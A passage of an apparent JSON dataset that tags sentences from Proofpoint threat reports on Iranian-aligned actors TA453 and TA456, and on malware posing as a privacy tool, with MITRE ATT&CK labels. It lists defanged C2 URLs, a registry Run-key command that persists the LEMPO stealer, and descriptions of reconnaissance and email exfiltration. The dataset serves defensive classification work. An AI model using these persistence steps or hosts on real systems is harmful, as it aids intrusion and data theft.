http://999080321tostest371-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321oopoest361-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder481-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder471-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder351-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder241-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-service100201shop25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-service100201life25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-service100201blog25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321megatest251-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321infotest341-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321besttest971-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321shoptest871-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321kupitest451-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321proftest981-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321clubtest561-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321mytest151-service1002012425999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfoldert161-service1002012425999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder100251-service25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder100241-service10020999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder100231-service1022020[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder100221-service1022020[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-012525999080321[.]ml/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-012625999080321[.]ga/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-012725999080321[.]cf/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-012825999080321[.]gq/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-012925999080321[.]com/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01302599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01312599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01322599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01332599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01342599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01352599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01362599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01372599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01382599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01392599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01402599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01412599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01422599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01432599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01442599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01452599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01462599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01472599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01482599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01492599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01502599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01512599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01522599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01532599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01542599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002-01552599908032135[.]site/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Operation SpoofedScholars: A Conversation with TA453", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "* [TA453](https://www.proofpoint.com/us/blog/threat-insight/badblood-ta453-targets-us-and-israeli-medical-research-personnel-credential), an\u00a0Iranian - state\u00a0aligned actor,\u00a0masqueraded as British scholars\u00a0to covertly target individuals of intelligence interest to the Iranian government in what Proofpoint has dubbed Operation\u00a0SpoofedScholars.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "* The email conversations were benign until TA453 provided a link to a compromised website hosting a credential harvesting page.", "labels": ["G0059", "TA0006", "T1566", "T1056"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "* The use of a legitimate but actor-compromised website is an increase in sophistication compared to TA453\u2019s historical Tactics, Techniques, and Procedures of using actor-controlled credential phishing websites.", "labels": ["G0059", "T1056"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Masquerading as\u00a0UK scholars\u00a0with the University of London\u2019s\u00a0School of Oriental and African Studies\u00a0(SOAS), the\u00a0threat actor TA453 has been covertly approaching individuals\u00a0since\u00a0at least\u00a0January 2021 to solicit sensitive information.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "The threat actor, an APT who we assess with high confidence supports Islamic\u00a0Revolutionary Guard Corps (IRGC) intelligence collection efforts,\u00a0established backstopping for their credential phishing infrastructure by compromising a legitimate site of a highly regarded academic institution to deliver personalized credential harvesting pages disguised as registration links.", "labels": ["TA0006", "T1056"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Once the conversation was established, TA453 delivered a \u201cregistration link\u201d to a legitimate but compromised website belonging to the University of London\u2019s SOAS radio.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Of note, TA453 also targeted the personal email accounts of at least one of their targets.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "In subsequent phishing\u00a0emails, TA453\u00a0shifted their tactics and\u00a0began delivering the registration link earlier\u00a0in their engagement with the target\u00a0without requiring extensive conversation.", "labels": ["T1566", "G0059", "T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "This operation, dubbed\u00a0SpoofedScholars,\u00a0represents one of the more sophisticated TA453 campaigns\u00a0identified\u00a0by\u00a0Proofpoint.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "### Chatting with TA453", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "In early 2021, a TA453 persona,\u00a0\u201cDr.Hanns\u00a0Bjoern\u00a0Kendel, Senior Teaching and Research Fellow at SOAS University in London,\u201d\u00a0used email address\u00a0hannse.kendel4[@]gmail.com\u00a0to solicit conversations\u00a0with targets.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453\u00a0sent an initial email\u00a0trying to entice the target with a prospective invitation to an online conference on \u201cThe US Security Challenges in the Middle East.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453sent an initial email\u00a0trying to entice the target with a prospective invitation to an online conference on \u201cThe US Security Challenges in the Middle East.", "labels": ["T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453 strived to connect with the\u00a0individual\u00a0via phone to discuss the invitation; however, after the target hedged\u00a0and emphatically stated that they wanted a written proposal with the details, TA453 acquiesced with conference specifics.", "labels": ["G0059", "G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "After a little back and forth that verified the target\u2019s interest, TA453\u00a0provided a detailed invitation to the fake conference (Figure 1).", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "The conversation concluded with TA453 attempting to get the target to connect via\u00a0videoconferencing.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "* TA453 demonstrates passable English skills and is open to voice communication via videoconferencing.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "* TA453 demonstrates an interest in mobile phone numbers, possibly for mobile malware or additional phishing.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "* TA453 repeatedly demonstrated a desire to connect with the target in real-time.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "In addition to\u00a0Hanns\u2019 solicitations, at least one target received a credential harvesting email to their personal email account.", "labels": ["T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "This attempt did not masquerade as Dr.\u00a0Kendel\u00a0but did still attempt to harvest credentials from the target.", "labels": ["TA0006"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453 targets in\u00a0Operation\u00a0SpoofedScholars\u00a0can be clustered into three main categories that are consistent with the IRGC\u2019s historical collection priorities.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "These groupings consistently have information of interest to the Iranian government, including, but not limited to, information about foreign policy, insights into Iranian dissident movements, and understanding of U.S. nuclear negotiations, and most of the identified targets have been previously targeted by TA453.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Once TA453 established a time for the target to activate their invitation, the\u00a0TA453\u00a0persona\u00a0provided the personalized link to\u00a0the\u00a0intended victim.", "labels": ["G0059", "G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "According to Proofpoint research, while TA453 does appear to have elevated privileges allowing them to create credential harvesting pages at\u00a0soasradio[.]org, other pages on the site continue to host legitimate SOAS-affiliated content.", "labels": ["G0059", "T1056"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453 strengthened the credibility of the attempted credential harvest by\u00a0utilizing\u00a0personas\u00a0masquerading as legitimate affiliates\u00a0of SOAS\u00a0to deliver the malicious links.", "labels": ["G0059", "T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "When a particular provider is clicked, a pop-up box\u00a0(Figure\u00a03)\u00a0displays the actual credential phishing box.", "labels": ["T1056"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Based on the variety of email providers along with TA453\u2019s insistence that the target log on when TA453 was online, Proofpoint assesses that TA453 was planning on immediately validating the captured credentials manually.", "labels": ["G0059", "G0059", "G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Hanns\u00a0Kendel\u00a0was not the only SOAS scholar spoofed by TA453\u00a0during\u00a0Operation\u00a0SpoofedScholars.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Months later,\u00a0TA453 began spoofing\u00a0Tolga\u00a0Sinmazdemir, another\u00a0individual associated with\u00a0SOAS.\u00a0", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "These\u00a0emails\u00a0solicited contributions to a\u00a0\u201cDIPS Conference\u201d\u00a0and would have likely followed a similar kill chain\u00a0discussed above.", "labels": ["T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "In mid-May,\u00a0TA453\u00a0returned, using a different\u00a0email\u00a0(hanse.kendel4[@]gmail.com)\u00a0to recruit for a webinar.", "labels": ["T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "As discussed previously in Proofpoint\u2019s research on TA453\u2019s\u00a0[BadBlood](/us/blog/threat-insight/badblood-ta453-targets-us-and-israeli-medical-research-personnel-credential \"BadBlood: TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns \")\u00a0campaign, Proofpoint analysts cannot independently confirm that TA453 is part of the IRGC.\u00a0", "labels": ["G0059", "G0059", "G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "However, the tactics and techniques used by the group and their overall targeting detected by Proofpoint is in line with IRGC intelligence collection priorities, which gives us high confidence in our assessment that\u00a0TA453 operates in\u00a0support\u00a0of\u00a0the IRGC.\u00a0The IRGC, specifically the IRGC Intelligence Organization, collects intelligence and conducts operations in support of a variety of assigned responsibilities.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Likewise, attribution specifically for\u00a0Operation\u00a0SpoofedScholars\u00a0is based on TTP similarities to previous TA453 campaigns and consistency with TA453\u2019s historical targeting.", "labels": ["G0059", "G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453 often uses free email providers to spoof individuals familiar to their targets to increase the likelihood of successful compromise.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Additionally, as previously discussed, TA453 concentrates their credential phishing to specific individuals of interest\u00a0to\u00a0collect\u00a0intelligence through exfiltration of sensitive email and contacts or initial access for future phishing campaigns.", "labels": ["G0059", "T1566"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Broader mitigation efforts against TA453 campaigns include increased awareness and investigation of unusual communication from professional contacts.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "Using multifactor authentication\u00a0provides another layer of protection against TA453 credential harvesting.", "labels": ["G0059", "TA0006"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453\u00a0illegally obtained access to a website belonging to a world class academic institution\u00a0to\u00a0leverage the\u00a0compromised infrastructure to harvest the credentials of their intended targets.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "The use of legitimate,\u00a0but compromised,\u00a0infrastructure represents an increase in TA453\u2019s sophistication\u00a0and will almost certainly\u00a0be reflected in future campaigns.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "TA453 continues to\u00a0iterate,\u00a0innovate,\u00a0and collect\u00a0in support of IRGC collection priorities.", "labels": ["G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "While\u00a0some\u00a0of the identified selectors\u00a0no longer appear to be active in TA453 operations, Proofpoint assesses with high confidence that TA453 will continue\u00a0to\u00a0spoof scholars\u00a0around the world\u00a0in support of\u00a0TA453\u2019s intelligence collection\u00a0operations\u00a0in\u00a0support of Iranian government interests.", "labels": ["G0059", "G0059", "G0059"], "document": "proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453"}, {"sentence": "I Knew You Were Trouble: TA456 Targets Defense Contractor with Alluring Social Media Persona", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* TA456, an\u00a0Iranian-state\u00a0aligned actor, spent\u00a0years\u00a0masquerading as the persona \u201cMarcella Flores\u201d in an attempt to infect the machine of an employee of an aerospace defense contractor with malware.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* The malware, dubbed\u00a0by Proofpoint as\u00a0LEMPO, was designed to establish persistence,\u00a0perform reconnaissance, and exfiltrate sensitive information.", "labels": ["TA0003", "TA0010", "TA0007"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* TA456 actively targets smaller subsidiaries and contractors in support of efforts to\u00a0compromise larger\u00a0defense contractors using a supply chain\u00a0compromise.", "labels": ["G0003", "T1195"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* While targeting defense contractors is not new for TA456, this campaign uniquely establishes the group\u00a0as one of the most\u00a0determined\u00a0Iranian-aligned threat actors tracked by Proofpoint because of its significant use of social engineering, cross platform communication, and general persistence.", "labels": ["G0003", "TA0003", "TA0011"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Proofpoint researchers have identified a years-long social engineering and targeted malware campaign by the Iranian-state aligned threat actor TA456.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Using the social media persona \u201cMarcella Flores,\u201d TA456 built\u00a0a relationship across corporate and personal communication platforms\u00a0with\u00a0an employee of a\u00a0small subsidiary of an\u00a0aerospace defense contractor.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "In early June 2021, the threat actor attempted to capitalize on this relationship by sending the target malware via\u00a0an ongoing email communication chain.", "labels": ["T1566"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Designed to conduct reconnaissance on the target\u2019s machine, the macro-laden\u00a0document\u00a0contained personalized content and demonstrated\u00a0the importance TA456 placed on the target.", "labels": ["G0003", "T1059"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Once the malware,\u00a0which is\u00a0an updated version of\u00a0[Liderc](https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html)\u00a0 that Proofpoint has dubbed LEMPO,\u00a0establishes\u00a0persistence, it\u00a0can\u00a0perform reconnaissance on\u00a0the\u00a0infected\u00a0machine,\u00a0save the reconnaissance details to the host,\u00a0exfiltrate\u00a0sensitive\u00a0information to an actor-controlled email account\u00a0via\u00a0SMTPS, and then cover\u00a0its\u00a0tracks by deleting that day\u2019s\u00a0host\u00a0artifacts.", "labels": ["TA0003", "TA0007", "T1070", "T1041"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "LEMPO, the malware,\u00a0whose\u00a0delivery\u00a0Proofpoint\u00a0disrupted, along with the network\u00a0of personas,\u00a0are\u00a0attributed to TA456.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "![TA456](/sites/default/files/inline-images/TA456.png)", "labels": ["G0003", "G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Proofpoint data shows that over at least eight months, \u201cMarcella\u00a0(Marcy)\u00a0Flores\u201d sent TA456\u2019s target benign\u00a0email\u00a0messages, photographs, and a video to establish her veracity and build rapport with\u00a0the intended victim.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "At one time, TA456 attempted to send a benign, but\u00a0flirtatious\u00a0video via a OneDrive\u00a0URL.\u00a0In early June,\u00a0a TA456\u00a0actor\u00a0self-identified as\u00a0\u201cMarcy\u201d\u00a0sent another OneDrive link, this time masquerading as a diet survey\u00a0(Figure 1).", "labels": ["G0003", "G0003", "T1566", "T1566"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "If\u00a0the content is enabled,\u00a0the\u00a0macro\u00a0will\u00a0create and hide the directory \\Appdata\\Perflog\u00a0and\u00a0then write LEMPO, a very simple but ingenious plaintext stealer comprised of Visual Basic Script (VBS), to that directory (Schedule.vbs 1534f95f49ddf2ada38561705f901e5938470c1678d6a81f0f4177ba7412ef5b).", "labels": ["T1059", "T1059", "TA0010"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "After authoring the\u00a0VBS, the\u00a0Excel macro\u00a0will\u00a0add a registry key\u00a0(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Schedule /t REG\\_SZ /d C:\\Users\\[redacted\\_username]\\AppData\\Perflog\\Schedule.vbs /f)\u00a0to ensure LEMPO is run\u00a0upon\u00a0user login.", "labels": ["T1059", "T1547", "T1547"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "After authoring the\u00a0VBS, the\u00a0Excel macrowill\u00a0add a registry key\u00a0(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Schedule /t REG\\_SZ /d C:\\Users\\[redacted\\_username]\\AppData\\Perflog\\Schedule.vbs /f)\u00a0to ensure LEMPO is run\u00a0upon\u00a0user login.", "labels": ["T1059"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The macro in the\u00a0Excel documentalso contains code to connect via HTTP POST to\u00a0showip[.]net.", "labels": ["T1059"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The macro in the\u00a0Excel document\u00a0also contains code to connect via HTTP POST toshowip[.]net.", "labels": ["T1071"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The response, along with the results of \"net use\" and \"netstat -nao\" are stored in a hidden sheet within the .xlsm, reminiscent of the technique described in Facebook's July 15th announcement.", "labels": ["S0104", "T1049"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Proofpoint analysts assess this may indicate code partially remaining from an earlier iteration of the tool that came before LEMPO or a desire for redundancy in TA456's reconnaissance tooling.", "labels": ["G0003", "TA0007"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "### LEMPO", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The\u00a0LEMPO reconnaissance\u00a0tool is\u00a0a\u00a0Visual Basic\u00a0Script\u00a0dropped by\u00a0an\u00a0Excel\u00a0macro.", "labels": ["T1059", "TA0007", "T1059"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Leveraging built-in Windows commands\u00a0it\u00a0enumerates the host in a variety of ways, records the collected data and then exfiltrates the intelligence to an actor-controlled email\u00a0account\u00a0using\u00a0Microsoft\u2019s\u00a0Collaboration Data Objects (CDO).", "labels": ["T1071"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "LEMPO collects\u00a0the following information and records\u00a0it to %temp%\\Logs.txt\u00a0", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Computer\u00a0and\u00a0usernames", "labels": ["T1033"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* System information\u00a0via WMIC\u00a0os,\u00a0sysaccount,\u00a0\u00a0environment,\u00a0and\u00a0computer\u00a0system\u00a0commands", "labels": ["T1082"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Antivirus products\u00a0located in the \u201cSecurityCenter2\u201d path", "labels": ["T1518"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Drives", "labels": ["T1083"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Tasklist", "labels": ["T1057"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Software\u00a0and\u00a0version", "labels": ["T1518"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Net\u00a0users and\u00a0user\u00a0details", "labels": ["T1033"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Following the connectivity check, detailed in the following section, LEMPO writes the following to\u00a0%temp%\\Logs.txt\u00a0", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* Firewall rules", "labels": ["T1016"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "* List of running processes via\u00a0Powershell\u00a0Get-Process", "labels": ["T1057", "T1059"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Prior to the network focused reconnaissance, LEMPO checks\u00a0connectivity by reaching out to Yandex, Google, Yahoo, Github, Mailchimp, Mega, Arxiv (an online\u00a0academic\u00a0repository specializing in electrical engineering and scientific research),\u00a0and Twitter using ping and curl\u00a0(Figure\u00a03).", "labels": ["S0097"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Prior to the network focused reconnaissance, LEMPO checks\u00a0connectivity by reaching out to Yandex, Google, Yahoo, Github, Mailchimp, Mega, Arxiv (an online\u00a0academic\u00a0repository specializing in electrical engineering and scientific research),\u00a0and Twitter using ping and curl(Figure\u00a03).", "labels": [], "document": 